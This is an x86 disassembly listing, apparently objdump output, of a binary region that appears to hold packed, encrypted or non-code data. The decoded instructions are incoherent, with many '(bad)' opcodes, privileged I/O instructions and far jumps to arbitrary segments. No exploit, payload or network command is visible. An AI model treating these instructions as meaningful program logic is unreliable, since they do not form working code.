  413eed:	ins    BYTE PTR es:[edi],dx
  413eee:	je     0x413f5f
  413ef0:	jns    0x413f60
  413ef2:	popa   
  413ef3:	push   esi
  413ef4:	push   ebp
  413ef5:	push   0x0
	...
  413f0a:	popa   
  413f0b:	push   edi
  413f0c:	push   esi
  413f0d:	push   esp
  413f0e:	dec    eax
  413f0f:	je     0x413f5d
  413f11:	push   ebx
  413f12:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413f16:	push   esp
  413f17:	arpl   WORD PTR [ecx+0x4b],cx
  413f1a:	inc    edi
  413f1b:	jne    0x413f63
  413f1d:	push   ebx
  413f1e:	outs   dx,DWORD PTR ds:[esi]
  413f1f:	push   ebx
  413f20:	inc    esi
  413f21:	inc    edi
  413f22:	push   0x66495949
  413f27:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413f2b:	push   esi
  413f2c:	jb     0x413f96
  413f2e:	add    BYTE PTR [eax],al
  413f30:	js     0x413fa6
  413f32:	popa   
  413f33:	inc    ebx
  413f34:	push   ecx
  413f35:	ins    BYTE PTR es:[edi],dx
  413f36:	pop    eax
  413f37:	ja     0x413f86
  413f39:	je     0x413fb1
  413f3b:	add    BYTE PTR [ebp+0x7a],dl
  413f3e:	ins    BYTE PTR es:[edi],dx
  413f3f:	jb     0x413fba
  413f41:	inc    edi
  413f42:	push   edi
  413f43:	push   esi
  413f44:	inc    edi
  413f45:	ins    BYTE PTR es:[edi],dx
  413f46:	add    BYTE PTR [eax],al
  413f48:	jbe    0x413f8e
  413f4a:	push   esi
  413f4b:	push   edi
  413f4c:	dec    edx
  413f4d:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  413f54:	add    BYTE PTR [eax],al
  413f56:	in     al,0xf5
  413f58:	jnp    0x413fa8
  413f5a:	jnp    0x413f2a
  413f5c:	cmc    
  413f5d:	call   FWORD PTR [ebx+0x61]
  413f60:	and    bh,dl
  413f62:	lods   eax,DWORD PTR ds:[esi]
  413f63:	pop    esi
  413f64:	mov    esi,0xd767ba
  413f69:	add    bh,bh
  413f6b:	add    BYTE PTR [eax],al
  413f6d:	add    BYTE PTR ds:0x8c885b25,dh
  413f73:	cmp    eax,0x9e0d1a15
  413f78:	iret   
  413f79:	int3   
  413f7a:	scas   al,BYTE PTR es:[edi]
  413f7b:	push   esi
  413f7c:	ficom  DWORD PTR [eax-0xf]
  413f7f:	not    DWORD PTR [edx]
  413f81:	cmp    BYTE PTR [esi],0x35
  413f84:	jmp    0x80f1:0x4a1c9d21
  413f8b:	or     DWORD PTR [ebx+eax*1],esi
  413f8e:	enter  0x912a,0x0
  413f92:	xchg   esi,eax
  413f93:	mov    ebp,0x1bce2f5b
  413f98:	pop    ss
  413f99:	push   esp
  413f9a:	xchg   ebx,eax
  413f9b:	ret    0xcf44
  413f9e:	dec    eax
  413f9f:	push   0x5b
  413fa1:	hlt    
  413fa2:	popf   
  413fa3:	push   ecx
  413fa4:	stos   DWORD PTR es:[edi],eax
  413fa5:	sbb    DWORD PTR [edx-0x5c8126e5],edi
  413fab:	push   esi
  413fac:	or     dl,ch
  413fae:	inc    esp
  413faf:	fistp  WORD PTR [esp+eax*4]
  413fb2:	aad    0x63
  413fb4:	cmp    eax,DWORD PTR [esi+eax*1]
  413fb7:	ficom  DWORD PTR [ebx+0x515c0c99]
  413fbd:	xchg   esp,ebx
  413fbf:	add    al,0x3b
  413fc1:	jbe    0x413fd0
  413fc3:	add    BYTE PTR [ecx+0x3d],0xfe
  413fc7:	push   es
  413fc8:	xor    cl,dh
  413fca:	mov    ds:0xd8d6071c,al
  413fcf:	jge    0x413fbd
  413fd1:	mov    ax,ds:0xe4dfbc4f
  413fd7:	jl     0x413f5b
  413fd9:	not    al
  413fdb:	int    0x1f
  413fdd:	repz jbe 0x413ff6
  413fe0:	push   esp
  413fe1:	sbb    DWORD PTR [ebp-0x2b],ecx
  413fe4:	jle    0x41402c
  413fe6:	inc    ebx
  413fe7:	ins    BYTE PTR es:[edi],dx
  413fe8:	fldenv [eax-0x138bd370]
  413fee:	push   esp
  413fef:	cs mov edi,0xc8d552b8
  413ff5:	pop    ebp
  413ff6:	clc    
  413ff7:	sahf   
  413ff8:	push   cs
  413ff9:	sbb    ch,BYTE PTR [esi+0x3c]
  413ffc:	jmp    0x413f85
  413ffe:	scas   al,BYTE PTR es:[edi]
  413fff:	xlat   BYTE PTR ds:[ebx]
  414000:	lahf   
  414001:	jle    0x413f92
  414003:	jecxz  0x414035
  414005:	je     0x414045
  414007:	adc    eax,0xe0cb2991
  41400c:	add    eax,0xbcdaeeac
  414011:	out    dx,eax
  414012:	bound  ecx,QWORD PTR [ecx+eiz*2+0x1af60a6c]
  414019:	in     al,dx
  41401a:	push   cs
  41401b:	mov    dl,0x62
  41401d:	mov    DWORD PTR [edi],eax
  41401f:	sbb    DWORD PTR [esi],edx
  414021:	aas    
  414022:	leave  
  414023:	inc    ecx
  414024:	mov    cl,0x3b
  414026:	std    
  414027:	sub    BYTE PTR [ebx-0x12],0xf
  41402b:	fistp  QWORD PTR [eax]
  41402d:	js     0x413fbb
  41402f:	lods   eax,DWORD PTR ds:[esi]
  414030:	cwde   
  414031:	cld    
  414032:	sub    ch,dh
  414034:	cmc    
  414035:	enter  0xf4f2,0x87
  414039:	out    0x94,eax
  41403b:	jge    0x413ffd
  41403d:	push   ebx
  41403e:	xchg   ebp,eax
  41403f:	mov    edx,0x48d02fd3
  414044:	inc    esp
  414045:	push   ecx
  414046:	inc    esp
  414047:	aas    
  414048:	stc    
  414049:	mov    ch,0xce
  41404b:	xchg   ebp,eax
  41404c:	xchg   ecx,eax
  41404d:	ins    BYTE PTR es:[edi],dx
  41404e:	loopne 0x414017
  414050:	lock ret 0xcc04
  414054:	gs mov ebp,0xf2d7dad4
  41405a:	pop    edx
  41405b:	call   0x43ead7aa
  414060:	push   cs
  414061:	repnz sub BYTE PTR [ecx+0x1ab07b1a],al
  414068:	test   DWORD PTR [ebp+0xc3ab34],ecx
	...
  4140d6:	pop    edx
  4140d7:	ficom  DWORD PTR [esi+0x60]
  4140da:	(bad)  
  4140db:	in     al,dx
  4140dc:	jle    0x4140d8
  4140de:	call   0xe33b:0x6ad52e96
  4140e5:	jmp    0x421950
  4140ea:	inc    DWORD PTR [eax]
  4140ec:	add    BYTE PTR [eax],al
  4140ee:	mov    bh,0x90
  4140f0:	clc    
  4140f1:	dec    eax
  4140f2:	mov    edi,0x1225dace
  4140f7:	shl    DWORD PTR [edx-0x51],0xb8
  4140fb:	mov    ds:0x67a93ed1,eax
  414100:	xacquire xchg DWORD PTR [ebx],ebp
  414103:	lods   eax,DWORD PTR ds:[esi]
  414104:	pop    ds
  414105:	retf   
  414106:	sub    esi,esi
  414108:	sub    al,0xba
  41410a:	mov    ?,WORD PTR [edx+0x48]
  41410d:	cdq    
  41410e:	cwde   
  41410f:	fwait
  414110:	imul   ecx,ebp,0xa7fd3f10
  414116:	add    DWORD PTR [eax-0x12],edx
  414119:	jmp    0x5f3e704c
  41411e:	push   ebx
  41411f:	out    dx,al
  414120:	retf   0xdb57
  414123:	add    BYTE PTR [edi+0x4],0x35
  414127:	je     0x414198
  414129:	add    BYTE PTR [edi],0x93
  41412c:	mov    ecx,0x40ac5b02
  414131:	rol    DWORD PTR ss:[esi+0x7e],1
  414135:	xchg   ebp,eax
  414136:	imul   edi,DWORD PTR [ebx+0x538e64be],0x250f5521
  414140:	xchg   edx,eax
  414141:	shl    DWORD PTR [eax+0x3673153],1
  414147:	cmp    DWORD PTR [eax],esp
  414149:	mov    BYTE PTR [edx],0x8d
  41414c:	test   edx,edi
  41414e:	sub    DWORD PTR ds:0x80e539f3,eax
  414154:	sbb    al,BYTE PTR [esi+0x9e66405]
  41415a:	loopne 0x414168
  41415c:	jne    0x4141bf
  41415e:	out    dx,al
  41415f:	push   ss
  414160:	cdq    
  414161:	retf   
  414162:	mov    esi,0xfc98a1f6
  414167:	push   edx
  414168:	shl    DWORD PTR [eax+0x2eabf5fe],0xe0
  41416f:	and    BYTE PTR ds:0xd15e1d45,dh
  414175:	daa    
  414176:	ds mov cl,0xfc
  414179:	(bad)  
  41417a:	pop    ebx
  41417b:	call   0x474e:0xa3b04ffb
  414182:	pop    esp
  414183:	inc    edi
  414184:	jp     0x414106
  414186:	pushf  
  414187:	cwde   
  414188:	sbb    ah,bl
  41418a:	pusha  
  41418b:	sar    BYTE PTR [esi-0x31cd8e62],0xf7
  414192:	jmp    0xa005:0xefcbf66b
  414199:	jb     0x414135
  41419b:	and    BYTE PTR [edi+0x7076a217],bl
  4141a1:	popa   
  4141a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141a3:	scas   eax,DWORD PTR es:[edi]
  4141a4:	pop    esp
  4141a5:	jmp    0x4141c0
  4141a7:	dec    ebp
  4141a8:	mov    al,ds:0x351528ba
  4141ad:	fwait
  4141ae:	jge    0x4141e6
  4141b0:	and    edx,DWORD PTR [ebp+0x3e5155f9]
  4141b6:	and    dl,bl
  4141b8:	test   DWORD PTR [eax-0x57],edi
  4141bb:	push   edi
  4141bc:	test   BYTE PTR [edx],dh
  4141be:	or     eax,ecx
  4141c0:	fiadd  WORD PTR [ebx]
  4141c2:	or     al,0x85
  4141c4:	and    BYTE PTR [ebp+0x6b50fae],ah
  4141ca:	inc    ebx
  4141cb:	sbb    BYTE PTR [eax-0x149de3d0],ah
  4141d1:	pop    esp
  4141d2:	jmp    0x1b45:0x5a8a5a98
  4141d9:	mov    bl,0x37
  4141db:	icebp  
  4141dc:	fxch   st(3)
  4141de:	leave  
  4141df:	and    eax,0x8efab194
  4141e4:	mov    ecx,0x23311815
  4141e9:	and    esp,eax
  4141eb:	jne    0x41422f
	...
  414255:	add    BYTE PTR [edx],al
  414257:	adc    al,BYTE PTR [ecx]
  414259:	mov    ds:0xb3a2b311,eax
  41425e:	mov    DWORD PTR [ecx+0x37],edx
  414261:	push   edi
  414262:	shl    DWORD PTR [ebx],cl
  414264:	ins    BYTE PTR es:[edi],dx
  414265:	sti    
  414266:	fld    DWORD PTR gs:[eax]
  414269:	add    bh,bh
  41426b:	add    BYTE PTR [eax],al
  41426d:	add    BYTE PTR [ecx-0x19],bl
  414270:	lahf   
  414271:	in     eax,0xce
  414273:	test   eax,0xc5cf9bae
  414278:	(bad)  
  414279:	ins    DWORD PTR es:[edi],dx
  41427a:	pop    eax
  41427b:	sub    eax,0xeba66bca
  414280:	data16 aam 0x13
  414283:	loopne 0x4142e1
  414285:	mov    esp,0x726b144b
  41428a:	push   ebx
  41428b:	outs   dx,DWORD PTR ds:[esi]
  41428c:	fimul  WORD PTR [eax+0x42]
  41428f:	add    DWORD PTR [esi-0xb],0xbd75cda4
  414296:	bound  eax,QWORD PTR [ecx]
  414298:	inc    esi
  414299:	pop    esp
  41429a:	mov    esi,0xc724440e
  41429f:	cmp    BYTE PTR [edi-0x2b239b87],bl
  4142a5:	enter  0x9be3,0x96
  4142a9:	jo     0x4142e1
  4142ab:	pop    eax
  4142ac:	sub    DWORD PTR [eax],eax
  4142ae:	pop    edx
  4142af:	jecxz  0x414325
  4142b1:	jno    0x4142d4
  4142b3:	jle    0x414312
  4142b5:	and    dh,0x51
  4142b8:	nop
  4142b9:	fdivr  st(4),st
  4142bb:	pop    sp
  4142bd:	dec    esp
  4142be:	xchg   esi,eax
  4142c0:	scas   al,BYTE PTR es:[edi]
  4142c1:	loopne 0x4142d1
  4142c3:	in     al,0xf
  4142c5:	dec    edx
  4142c6:	jp     0x414260
  4142c8:	outs   dx,DWORD PTR ds:[esi]
  4142c9:	idiv   BYTE PTR [ecx-0x4b]
  4142cc:	loope  0x414340
  4142ce:	mov    ebx,ss
  4142d0:	pop    ebp
  4142d1:	(bad)  
  4142d2:	aad    0x48
  4142d4:	sbb    al,0x96
  4142d6:	and    al,0x7e
  4142d8:	fs (bad) 
  4142db:	xchg   ebp,eax
  4142dc:	out    0xf6,eax
  4142de:	dec    esi
  4142df:	lahf   
  4142e0:	jle    0x4142fc
  4142e2:	fnstsw ax
  4142e4:	in     al,dx
  4142e5:	mov    ss,WORD PTR [esi]
  4142e7:	sbb    edi,DWORD PTR [edx]
  4142e9:	add    ebx,DWORD PTR [eax-0x6b5568f4]
  4142ef:	out    dx,al
  4142f0:	inc    ebp
  4142f1:	je     0x41430e
  4142f3:	sub    DWORD PTR [eax-0x76],edi
  4142f6:	sub    dh,BYTE PTR [ebx-0x10]
  4142f9:	mov    ss,WORD PTR [ebx+0x58]
  4142fc:	mov    ebp,0xc131ab1d
  414301:	sbb    ebp,DWORD PTR [eax]
  414303:	mov    WORD PTR [ecx+ebp*1],cs
  414306:	mov    ds:0xee8bc50c,eax
  41430b:	(bad)  
  41430d:	retf   0xe3f0
  414310:	fmul   DWORD PTR [edx-0x61]
  414313:	mov    dl,BYTE PTR [eax-0x4d]
  414316:	fsubr  QWORD PTR [edi]
  414318:	cmp    al,0xf9
  41431a:	sub    ebx,esp
  41431c:	cmp    DWORD PTR [eax],edx
  41431e:	(bad)
  414321:	call   0x538f93f6
  414326:	popa   
  414327:	fwait
  414328:	pop    es
  414329:	pop    ds
  41432a:	clc    
  41432b:	or     ebx,eax
  41432d:	xor    al,0xd7
  41432f:	popf   
  414330:	enter  0xbd58,0xfa
  414334:	push   esi
  414335:	outs   dx,BYTE PTR ds:[esi]
  414336:	push   ebp
  414337:	ret    
  414338:	xchg   edi,eax
  414339:	inc    BYTE PTR [ebp+0x3d22a65a]
  41433f:	pop    ss
  414340:	mov    ds:0xc1d1e1ca,al
  414345:	in     eax,0xb5
  414347:	cmp    esi,0xacc8bd75
  41434d:	mov    esi,DWORD PTR [edx+0x7814a487]
  414353:	and    DWORD PTR [eax],eax
  414355:	and    eax,0xa07cc2ba
  41435a:	push   edx
  41435b:	(bad)  
  41435d:	mov    edx,0xe1bf2f7d
  414362:	inc    ebx
  414363:	data16 mov dh,0xea
  414366:	add    ch,BYTE PTR [edi]
  414368:	jmp    0xaf101942
	...
  4143d5:	add    BYTE PTR [ecx],al
  4143d7:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  4143de:	rol    DWORD PTR [ebp+0x5e],0xa1
  4143e2:	add    al,0x50
  4143e4:	sbb    DWORD PTR [ebx],0xda64
  4143ea:	inc    DWORD PTR [eax]
  4143ec:	add    BYTE PTR [eax],al
  4143ee:	xor    eax,0x1336965a
  4143f3:	push   ebx
  4143f4:	adc    BYTE PTR [edi],ah
  4143f6:	das    
  4143f7:	xchg   ebp,eax
  4143f8:	out    dx,eax
  4143f9:	clc    
  4143fa:	jmp    0xfc153ce
  4143ff:	add    ch,al
  414401:	or     BYTE PTR [ebp+0x56],cl
  414404:	mov    BYTE PTR [eax+0x27e13f1f],cl
  41440a:	cld    
  41440b:	and    esp,esp
  41440d:	repz aad 0x1f
  414410:	jecxz  0x4143e3
  414412:	js     0x4143b4
  414414:	jmp    0x248c:0xfce652e
  41441b:	aaa    
  41441c:	lock jmp 0x5069:0xdb954e8
  414424:	push   0x66d24e82
  414429:	xor    eax,DWORD PTR [eax]
  41442b:	sahf   
  41442c:	ret    0x9606
  41442f:	jbe    0x41441a
  414431:	mov    eax,ds:0x6fca2d5a
  414436:	cmp    ecx,DWORD PTR [edx+0x7a]
  414439:	repnz pop es
  41443b:	xor    dl,dl
  41443d:	and    esp,esp
  41443f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414440:	and    edx,DWORD PTR [ebp-0x8a9da01]
  414446:	out    0xdf,eax
  414448:	aas    
  414449:	and    eax,0xdcfc2293
  41444e:	or     DWORD PTR [eax],ebx
  414450:	sbb    BYTE PTR [esi],dh
  414452:	ret    0xaf74
  414455:	jmp    0x7a1577f1
  41445a:	pop    ss
  41445b:	loopne 0x41446a
  41445d:	mov    DWORD PTR [ebp-0x3d],esi
  414460:	cdq    
  414461:	push   ebx
  414462:	xor    BYTE PTR ds:0x3ec30f20,dl
  414468:	fstp   st(0)
  41446a:	sub    DWORD PTR [edi+0x49],eax
  41446d:	jmp    0x414484
  41446f:	cld    
  414470:	dec    esp
  414471:	sbb    dh,BYTE PTR [ebx-0x7f56ece3]
  414477:	jno    0x414410
  414479:	outs   dx,BYTE PTR ds:[esi]
  41447a:	rcr    bl,1
  41447c:	retf   0x3293
  41447f:	dec    esp
  414480:	and    al,0x27
  414482:	sub    BYTE PTR [ebp-0x4a296e50],ch
  414488:	mov    esp,0xba30fc0
  41448d:	push   ss
  41448e:	aaa    
  41448f:	xor    eax,0x311c4c
  414494:	fnstsw ax
  414496:	in     eax,dx
  414497:	rcl    DWORD PTR [eax+0x5f],1
  41449a:	inc    ebx
  41449b:	stos   BYTE PTR es:[edi],al
  41449c:	imul   ebx,DWORD PTR [edi],0x0
  41449f:	mov    ebx,0x6cccb9c
  4144a4:	aad    0xf4
  4144a6:	xor    al,0x5c
  4144a8:	fld    TBYTE PTR [eax]
  4144aa:	arpl   bp,cx
  4144ac:	sub    edi,DWORD PTR [ecx]
  4144ae:	out    0x3a,eax
  4144b0:	mov    ecx,0xe1a1a35a
  4144b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144b6:	shl    DWORD PTR [edi],1
  4144b8:	jns    0x4144ae
  4144ba:	and    ah,dl
  4144bc:	dec    esi
  4144bd:	xor    al,0x14
  4144bf:	push   ebp
  4144c0:	cli    
  4144c1:	icebp  
  4144c2:	inc    esi
  4144c3:	fs scas eax,DWORD PTR es:[edi]
  4144c5:	test   al,0x13
  4144c7:	lock in eax,dx
  4144c9:	repnz pop ebp
  4144cb:	hlt    
  4144cc:	dec    ecx
  4144cd:	fild   QWORD PTR [eax-0x63]
  4144d0:	repnz xchg edi,eax
  4144d2:	sub    esp,DWORD PTR [esi]
  4144d4:	jno    0x414498
  4144d6:	cmp    ah,al
  4144d8:	sub    al,0xcc
  4144da:	pop    ecx
  4144db:	sbb    DWORD PTR [esi],ebx
  4144dd:	test   BYTE PTR ds:0x5648af97,bh
  4144e3:	cwde   
  4144e4:	and    BYTE PTR [ecx-0x42],cl
  4144e7:	pop    esi
  4144e8:	cli    
  4144e9:	ins    BYTE PTR es:[edi],dx
  4144ea:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4144ec:	cld    
	...
  414555:	add    BYTE PTR [ebx+0x73],bl
  414558:	inc    edx
  414559:	or     eax,0x775f3d6a
  41455e:	pop    ds
  41455f:	dec    edi
  414560:	or     cl,BYTE PTR [esi-0xa]
  414563:	scas   eax,DWORD PTR es:[edi]
  414564:	call   0x11ca8c8
  414569:	add    bh,bh
  41456b:	add    BYTE PTR [eax],al
  41456d:	add    BYTE PTR [ebp+0xa],ah
  414570:	xchg   ebx,eax
  414571:	sub    al,0x26
  414573:	mov    cl,0x2d
  414575:	xchg   ebx,eax
  414576:	hlt    
  414577:	(bad)  
  414578:	mov    eax,0xf885976e
  41457d:	sbb    al,0xe9
  41457f:	outs   dx,BYTE PTR ds:[esi]
  414580:	jb     0x41459b
  414582:	jno    0x4145bf
  414584:	fcomp  DWORD PTR [esi-0x4f98f900]
  41458a:	jns    0x414578
  41458c:	push   ss
  41458d:	cdq    
  41458e:	icebp  
  41458f:	add    bh,BYTE PTR [ebx-0x5f43ca29]
  414595:	clc    
  414596:	mov    WORD PTR [ecx+eiz*4-0x57ac87bb],?
  41459d:	pop    edx
  41459e:	jne    0x41453f
  4145a0:	neg    DWORD PTR [eiz*1-0x1c084c84]
  4145a7:	cdq    
  4145a8:	scas   al,BYTE PTR es:[edi]
  4145a9:	xchg   ebp,eax
  4145aa:	retf   
  4145ab:	dec    ecx
  4145ac:	rcr    BYTE PTR [ebx],0x6d
  4145af:	loope  0x414599
  4145b1:	mov    eax,0x9973e247
  4145b6:	mov    esi,?
  4145b8:	ja     0x414566
  4145ba:	jl     0x41459b
  4145bc:	lods   al,BYTE PTR ds:[esi]
  4145bd:	stos   DWORD PTR es:[edi],eax
  4145be:	int3   
  4145bf:	cli    
  4145c0:	xor    ch,BYTE PTR ds:0xb0ea7cf5
  4145c6:	push   eax
  4145c7:	cli    
  4145c8:	aaa    
  4145c9:	in     eax,0xef
  4145cb:	inc    esi
  4145cc:	inc    esi
  4145cd:	es cli 
  4145cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145d0:	jo     0x4145fa
  4145d2:	lahf   
  4145d3:	or     eax,0xdf5b041c
  4145d8:	jecxz  0x4145ea
  4145da:	hlt    
  4145db:	test   eax,0x4e3d49bb
  4145e0:	xor    dl,BYTE PTR ds:0x6ddb7434
  4145e6:	xchg   esp,eax
  4145e7:	pop    esi
  4145e8:	add    edx,DWORD PTR ds:0xa7d5db33
  4145ee:	fsub   DWORD PTR [ecx]
  4145f0:	jg     0x41457f
  4145f2:	loop   0x41459a
  4145f4:	mov    eax,0x3279632c
  4145f9:	cld    
  4145fa:	sub    DWORD PTR [bx+si],ecx
  4145fd:	cdq    
  4145fe:	pop    edx
  4145ff:	cdq    
  414600:	cmc    
  414601:	mov    ebp,0xd2167fa
  414606:	mov    eax,0xc32f0ebb
  41460b:	xor    DWORD PTR [edx],0xfffffffc
  41460e:	cmp    eax,0x1bc1960
  414613:	fs mov eax,0x39d2505d
  414619:	or     bh,BYTE PTR [edx-0x1f7478ea]
  41461f:	icebp  
  414620:	mov    al,ds:0x21875d45
  414625:	dec    esp
  414626:	or     BYTE PTR [esi+0x34ce4e2e],bl
  41462c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41462d:	mov    ?,WORD PTR [ebx]
  41462f:	bnd jno 0x41460a
  414632:	push   esp
  414633:	(bad)  
  414634:	stc    
  414635:	je     0x4146b6
  414637:	mov    ds:0x74822db5,eax
  41463c:	and    ebp,DWORD PTR [ecx+eax*1+0x53]
  414640:	add    al,0x50
  414642:	sbb    BYTE PTR [esi+ebx*4-0x2e771158],cl
  414649:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41464a:	sub    al,0xe7
  41464c:	icebp  
  41464d:	fisttp QWORD PTR [ecx]
  41464f:	mov    dl,0x2c
  414651:	test   al,0xed
  414653:	push   ebx
  414654:	dec    esi
  414655:	mov    ecx,0xae673665
  41465a:	and    dh,ch
  41465c:	retf   
  41465d:	push   edi
  41465e:	mov    ebp,0x67da9a5d
  414663:	js     0x4146d3
  414665:	(bad)  
  414666:	mov    esi,0x1e0c5542
  41466b:	jmp    0x41463e
	...
  4146d5:	add    BYTE PTR [edi+0x5e],bh
  4146d8:	cmc    
  4146d9:	ins    DWORD PTR es:[edi],dx
  4146da:	cmc    
  4146db:	out    dx,eax
  4146dc:	call   FWORD PTR [esi+0x17]
  4146df:	enter  0xab7a,0x5f
  4146e3:	add    al,0x27
  4146e5:	mov    WORD PTR [edx-0x24],fs
  4146e8:	add    BYTE PTR [eax],al
  4146ea:	inc    DWORD PTR [eax]
  4146ec:	add    BYTE PTR [eax],al
  4146ee:	mov    ch,0x28
  4146f0:	jmp    0x9939:0x499f6170
  4146f7:	fcmovnbe st,st(4)
  4146f9:	mov    cl,0x2f
  4146fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146fc:	call   0x6667:0x46186a9a
  414703:	push   0xd
  414705:	das    
  414706:	pop    ebx
  414707:	sbb    BYTE PTR [esi],bl
  414709:	ffreep st(5)
  41470b:	mov    edi,0x8d1ece23
  414710:	(bad)  
  414711:	xchg   ebp,eax
  414712:	sub    al,0x8a
  414714:	or     al,0x14
  414716:	stos   DWORD PTR es:[edi],eax
  414717:	xchg   edx,eax
  414718:	xor    cl,bl
  41471a:	sar    BYTE PTR [esi-0x29],cl
  41471d:	jmp    0x96e93539
  414722:	push   eax
  414723:	sti    
  414724:	xor    bl,BYTE PTR ds:0x74e41ee8
  41472a:	ret    0x2ae2
  41472d:	fdivp  st(5),st
  41472f:	mov    WORD PTR [edi+0x78],fs
  414732:	loop   0x4146f2
  414734:	mov    edi,0x870ada1b
  414739:	sub    dl,BYTE PTR [edi+0x7e]
  41473c:	mov    BYTE PTR [edx+0x7a],dh
  41473f:	std    
  414740:	dec    ebp
  414741:	cmp    eax,0x8413ae2
  414746:	in     al,dx
  414747:	mov    edi,0xe11b22c4
  41474c:	test   ch,0xf5
  41474f:	in     eax,0xc
  414751:	jg     0x41474d
  414753:	push   ds
  414754:	fstp   QWORD PTR [esi-0x5d386df7]
  41475a:	pop    eax
  41475b:	push   ebp
  41475c:	cdq    
  41475d:	shl    BYTE PTR [ecx],0x45
  414760:	dec    edi
  414761:	or     eax,0x4a92869a
  414766:	mov    WORD PTR [ebx],cs
  414768:	pop    edi
  414769:	jbe    0x414752
  41476b:	mov    eax,ds:0x16f20fff
  414770:	inc    edx
  414771:	adc    DWORD PTR [eax+0x76e43cea],esp
  414777:	push   ebp
  414778:	ret    0x7209
  41477b:	in     eax,0x34
  41477d:	dec    edi
  41477e:	push   edi
  41477f:	inc    edi
  414780:	pop    edi
  414781:	cmp    DWORD PTR [edi-0x51],ebp
  414784:	pop    ss
  414785:	jno    0x414800
  414787:	ds enter 0x374b,0x92
  41478c:	fcmovbe st,st(2)
  41478e:	sahf   
  41478f:	out    0x4a,al
  414791:	xchg   bl,dh
  414793:	inc    eax
  414794:	leave  
  414795:	push   esp
  414796:	ins    DWORD PTR es:[edi],dx
  414797:	cwde   
  414798:	ins    BYTE PTR es:[edi],dx
  414799:	outs   dx,DWORD PTR ds:[esi]
  41479a:	fidiv  DWORD PTR [eax+0x45]
  41479d:	fstp   QWORD PTR [ebx+0x2e462d68]
  4147a3:	push   esp
  4147a4:	pop    esi
  4147a5:	mov    ch,0x53
  4147a7:	jmp    0x35ad:0x255fd477
  4147ae:	std    
  4147af:	ss pop edi
  4147b1:	inc    edx
  4147b2:	gs inc eax
  4147b4:	mov    ?,edi
  4147b6:	or     bh,BYTE PTR [ebx]
  4147b8:	mov    al,ds:0x4f84e896
  4147bd:	daa    
  4147be:	pop    esi
  4147bf:	iret   
  4147c0:	inc    ebp
  4147c1:	xchg   esp,eax
  4147c2:	jb     0x414769
  4147c4:	dec    ebx
  4147c5:	or     DWORD PTR ds:0x87c64752,edx
  4147cb:	out    dx,eax
  4147cc:	pop    edi
  4147cd:	mov    bh,0xf6
  4147cf:	in     al,dx
  4147d0:	mov    esi,0xf23dfcd4
  4147d5:	paddusb mm0,QWORD PTR [esi]
  4147d8:	push   ss
  4147d9:	cmp    ecx,DWORD PTR [ecx+0x3b]
  4147dc:	hlt    
  4147dd:	mov    eax,ds:0x87a564a6
  4147e2:	gs push ss
  4147e4:	mov    eax,0xb4d94201
  4147e9:	retf   0xda67
  4147ec:	lea    eax,[eax]
	...
  414856:	jle    0x414887
  414858:	add    DWORD PTR [ebp+0x51],ebp
  41485b:	outs   dx,DWORD PTR ds:[esi]
  41485c:	jle    0x41489d
  41485e:	aas    
  41485f:	mov    BYTE PTR [esi],cl
  414861:	cmp    eax,0x6ba74179
  414866:	popa   
  414867:	fld    QWORD PTR [eax]
  414869:	add    bh,bh
  41486b:	add    BYTE PTR [eax],al
  41486d:	add    BYTE PTR [eax+0x3b],ah
  414870:	sbb    BYTE PTR [ebx],bh
  414872:	push   ecx
  414873:	rcr    DWORD PTR [ebx-0x17],1
  414876:	pop    edi
  414877:	jmp    0xa235:0x3d9df48c
  41487e:	cwde   
  41487f:	mov    al,ds:0x1193c30
  414884:	mov    ah,0x4e
  414886:	(bad)  
  414887:	(bad)  
  414888:	mov    ah,BYTE PTR [esi]
  41488a:	dec    esi
  41488b:	mov    edx,0xd13e1c9e
  414890:	or     DWORD PTR [ebp+eax*2-0x4],eax
  414894:	jge    0x414855
  414896:	sbb    BYTE PTR [ecx-0x59],dh
  414899:	xor    eax,0xd1ce0d45
  41489e:	mov    BYTE PTR [edx+edx*1+0x2514588d],bl
  4148a5:	scas   eax,DWORD PTR es:[edi]
  4148a6:	mov    cs,WORD PTR [ecx+0x8359e9c]
  4148ac:	imul   ebx,DWORD PTR [ebx],0x4f
  4148af:	sbb    eax,0x8d3db47c
  4148b4:	xchg   esp,eax
  4148b5:	dec    esi
  4148b6:	lock add ah,bl
  4148b9:	hlt    
  4148ba:	jecxz  0x4148b1
  4148bc:	imul   eax,DWORD PTR [ecx-0x1c],0xcc81766c
  4148c3:	jp     0x414920
  4148c5:	fldln2 
  4148c7:	sub    al,0x3b
  4148c9:	mov    ah,0xd6
  4148cb:	mov    ss,WORD PTR [ebp-0x1791f027]
  4148d1:	pop    edx
  4148d2:	je     0x414893
  4148d4:	inc    ebp
  4148d5:	pop    esi
  4148d6:	shl    DWORD PTR [edi+ebp*4+0x45],cl
  4148da:	outs   dx,BYTE PTR ds:[esi]
  4148db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148dc:	adc    ah,dl
  4148de:	adc    al,0x3a
  4148e0:	fcom   QWORD PTR [edx]
  4148e2:	cld    
  4148e3:	mul    BYTE PTR [eax-0xa5bd108]
  4148e9:	loop   0x4148b8
  4148eb:	cs call 0xe67d5b41
  4148f1:	aas    
  4148f2:	dec    esp
  4148f3:	dec    esp
  4148f4:	add    BYTE PTR [ebx+0x10],bh
  4148f7:	pushf  
  4148f8:	jmp    0x4148fa
  4148fa:	inc    edx
  4148fb:	xchg   edi,eax
  4148fc:	repnz or DWORD PTR [esi-0x48],edx
  414900:	dec    esp
  414901:	scas   eax,DWORD PTR es:[edi]
  414902:	les    esi,FWORD PTR [esi+0x12c623b1]
  414908:	xchg   edi,eax
  414909:	(bad)  
  41490a:	aaa    
  41490b:	rcr    BYTE PTR [esi-0x63],cl
  41490e:	je     0x4148ed
  414910:	lock jno 0x4148ea
  414913:	push   edi
  414914:	mov    ch,0xcb
  414916:	stos   BYTE PTR es:[edi],al
